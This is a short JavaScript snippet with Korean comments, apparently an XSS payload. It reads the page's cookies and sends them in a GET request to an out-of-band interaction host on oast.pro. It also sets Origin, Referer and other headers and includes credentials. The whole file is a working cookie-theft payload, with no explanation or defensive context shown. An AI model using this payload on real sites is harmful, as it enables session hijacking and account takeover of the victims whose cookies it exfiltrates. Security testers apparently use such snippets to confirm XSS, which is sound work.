(function() {
    // 서버로 쿠키를 전송할 URL
    const targetUrl = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";

    // 현재 문서의 쿠키를 가져옴
    const cookies = document.cookie;

    // GET 요청을 위한 URL에 쿠키를 포함
    const url = `${targetUrl}?cookie=${encodeURIComponent(cookies)}`;

    // fetch를 사용해 요청 보내기 (헤더 추가)
    fetch(url, {
        method: 'GET',
        headers: {
            'Accept': 'application/json',
            'User-Agent': navigator.userAgent, // 브라우저의 User-Agent를 그대로 사용
            'Referer': document.referrer,     // 현재 문서의 Referer
            'Origin': window.location.origin, // 현재 사이트의 Origin
            'X-Requested-With': 'XMLHttpRequest' // AJAX 요청을 식별하기 위한 헤더 (선택 사항)
        },
        credentials: 'include' // 쿠키 포함
    })
    .then(response => response.json()) // 응답 처리 (만약 JSON 형식의 응답이 있을 경우)
    .catch(error => console.error('Request failed', error)); // 에러 처리
})();
